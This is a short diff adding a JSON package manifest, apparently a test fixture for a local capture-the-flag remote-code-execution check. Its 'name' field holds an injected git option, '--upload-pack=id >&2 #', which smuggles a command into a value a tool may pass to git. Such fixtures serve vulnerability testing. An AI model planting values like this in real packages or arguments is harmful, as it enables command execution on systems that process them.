@@ -1,0 +1,7 @@
+{
+  "type": "Atom",
+  "author": "test",
+  "name": "--upload-pack=id >&2 #",
+  "version": "1.0.0",
+  "description": "local CTF RCE validation"
+}
